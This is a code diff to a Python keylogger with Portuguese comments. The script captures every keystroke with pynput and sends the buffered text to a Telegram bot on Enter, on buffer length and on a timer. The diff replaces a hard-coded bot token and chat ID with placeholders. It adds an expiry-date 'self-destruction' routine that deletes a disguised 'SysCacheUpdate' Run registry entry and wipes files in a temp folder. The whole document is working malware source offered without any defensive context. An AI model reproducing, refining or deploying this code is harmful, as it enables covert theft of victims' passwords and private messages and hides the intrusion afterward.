@@ -3,10 +3,20 @@ from pynput.keyboard import Key, Listener
 import time
 import threading
 import os
+import datetime
+import subprocess
 import sys
 
-TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
-CHAT_ID = "-1004356233671"
+# --- CONFIGURAÇÕES ---
+TOKEN = "SEU_NOVO_TOKEN_AQUI"
+CHAT_ID = "SEU_NOVO_CHAT_ID_AQUI"
+DATA_EXPIRACAO = datetime.date(2026, 12, 31) 
+
+# --- SISTEMA DE AUTODESTRUIÇÃO ---
+if datetime.date.today() > DATA_EXPIRACAO:
+    os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SysCacheUpdate" /f')
+    subprocess.Popen('timeout /t 5 && del /q %TEMP%\\sys_cache\\*.*', shell=True)
+    sys.exit()
 
 buffer = ""
 
@@ -24,52 +34,29 @@ def on_press(key):
     try:
         buffer += key.char
     except AttributeError:
-        vk = getattr(key, 'vk', None)
-        numpad_map = {
-            96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 
-            101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
-            110: '.', 109: '*', 107: '-', 111: '/', 108: ',',
-            13: '[ENTER]' 
-        }
-        if vk in numpad_map:
-            val = numpad_map[vk]
-            if val == '[ENTER]':
-                send_to_telegram(buffer + " [ENTER]")
-                buffer = ""
-            else:
-                buffer += val
-        elif key == Key.space:
+        if key == Key.space:
             buffer += " "
         elif key == Key.enter:
             send_to_telegram(buffer + " [ENTER]")
             buffer = ""
         elif key == Key.backspace:
             buffer = buffer[:-1]
-        elif key == Key.tab:
-            buffer += " [TAB] "
-        elif key in [Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.alt, Key.alt_gr]:
-            pass 
         else:
-            key_name = str(key).replace("Key.", "")
-            buffer += f" [{key_name}] "
+            buffer += f" [{str(key).replace('Key.', '')}] "
 
-    if len(buffer) >= 20:
+    if len(buffer) >= 30:
         send_to_telegram(buffer)
         buffer = ""
 
 def auto_send():
     global buffer
     while True:
-        time.sleep(10) 
+        time.sleep(60)
         if buffer:
             send_to_telegram(buffer + " [AUTO-SEND]")
             buffer = ""
 
 threading.Thread(target=auto_send, daemon=True).start()
 
-while True:
-    try:
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-    except Exception:
-        time.sleep(10)
+with Listener(on_press=on_press) as listener:
+    listener.join()
